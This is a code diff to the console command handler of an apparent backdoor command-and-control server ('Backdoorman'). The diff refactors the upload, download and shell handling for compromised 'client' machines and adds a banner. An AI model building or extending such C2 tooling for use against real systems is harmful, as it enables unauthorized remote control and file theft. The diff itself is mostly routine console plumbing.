@@ -8,7 +8,7 @@ import json
 import time
 import signal
 import readline
-
+from .banner import BackdoormanBanner
 from ..session.client_session import ClientSession
 from ..utils.file_transfer import FileTransfer
 
@@ -51,8 +51,8 @@ class CommandHandler:
                         break
 
                     cmd = input()
-                    if cmd.lower() == "exit":
-                        break
+                    # if cmd.lower() == "exit":
+                    #     break
 
                     if cmd == '\x03':  # Ctrl+C received
                         if client.pty_enabled:
@@ -83,7 +83,7 @@ class CommandHandler:
         def main_sigint_handler(signum, frame):
             """Main console signal handler"""
             if not self.in_shell:
-                print("\nUse 'exit' to quit")
+                print("\nUse 'quit' to quit")
             
         # Set up main console signal handler
         signal.signal(signal.SIGINT, main_sigint_handler)
@@ -91,6 +91,7 @@ class CommandHandler:
         self.running = True
         logger.info("Command interface started")
         
+        BackdoormanBanner.display()
         print("\nC2 Server Command Interface")
         print("Type 'help' for available commands")
         
@@ -160,6 +161,7 @@ class CommandHandler:
             return f"c2({client.hostname})> "
         return "c2> "
     
+
     def _process_command(self, cmd_line: str):
         """Process a command line input"""
         # Split the command with proper handling of quotes
@@ -207,13 +209,13 @@ class CommandHandler:
             if len(args) < 3:
                 print("Usage: upload <local_file> <remote_path>")
                 return
-            self._upload_file(args[1], args[2])
-            
+            self._handle_upload(args[1], args[2])
+                
         elif cmd == "download":
             if len(args) < 2:
                 print("Usage: download <remote_file>")
                 return
-            self._download_file(args[1])
+            self._handle_download(args[1])
             
         # Send command to client
         else:
@@ -368,7 +370,6 @@ class CommandHandler:
         original_sigint = signal.getsignal(signal.SIGINT)
         signal.signal(signal.SIGINT, shell_sigint_handler)
         
-        empty_count = 0
         
         try:
             while self.in_shell and client.is_active:
@@ -406,62 +407,22 @@ class CommandHandler:
             self.in_shell = False
             print(f"\n", end="", flush=True)
     
-    def _upload_file(self, local_path: str, remote_path: str):
-        """Upload a file to the client"""
+    def _handle_upload(self, local_path: str, remote_path: str):
+        """Handle file upload command"""
         if not self.current_client_id or self.current_client_id not in self.clients:
             print("No client selected")
             return
             
         client = self.clients[self.current_client_id]
-        if not client.is_active:
-            print("Selected client is not active")
-            return
-            
-        # Expand path if needed
-        local_path = os.path.expanduser(local_path)
-        
-        # Prepare upload command
-        success, command = self.file_transfer.prepare_upload_command(local_path, remote_path)
-        if not success:
-            print(command)  # Error message
-            return
-            
-        try:
-            print(f"Uploading {local_path} to {remote_path}...")
-            response = client.send_command(command)
-            
-            if response.startswith("SUCCESS"):
-                print(f"File uploaded successfully to {remote_path}")
-            else:
-                print(f"Upload failed: {response}")
-                
-        except Exception as e:
-            logger.error(f"Upload error: {e}")
-            print(f"Upload failed: {str(e)}")
-    
-    def _download_file(self, remote_path: str):
-        """Download a file from the client"""
+        success, message = self.file_transfer.upload_file(client, local_path, remote_path)
+        print(message)
+
+    def _handle_download(self, remote_path: str):
+        """Handle file download command"""
         if not self.current_client_id or self.current_client_id not in self.clients:
             print("No client selected")
             return
             
         client = self.clients[self.current_client_id]
-        if not client.is_active:
-            print("Selected client is not active")
-            return
-            
-        try:
-            command = self.file_transfer.prepare_download_command(remote_path)
-            print(f"Downloading {remote_path}...")
-            
-            response = client.send_command(command)
-            success, message, path = self.file_transfer.handle_download_response(client.id, response)
-            
-            if success:
-                print(message)
-            else:
-                print(f"Download failed: {message}")
-                
-        except Exception as e:
-            logger.error(f"Download error: {e}")
-            print(f"Download failed: {str(e)}")
+        success, message, _ = self.file_transfer.download_file(client, remote_path)
+        print(message)
